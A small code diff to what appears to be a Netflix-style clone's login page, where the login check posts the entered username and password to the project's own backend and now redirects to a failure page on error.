@@ -19,11 +19,13 @@ function handlepass(e){
 }
 
 function check(){
-    var login=axios.post("https://netflixsloginpage.onrender.com/login",{"username":user,"password":pass});
+    var login=axios.post("https://netflixsloginpage.onrender.com/login",{username:user,password:pass});
     login.then (function(res){
 
     console.log(res)
-    login.catch((err)=>{console.log(err)})
+    login.catch((err)=>{console.log(err)
+        navigate('/fail')
+    })
 
     if(res.data==true){
         navigate("/success")
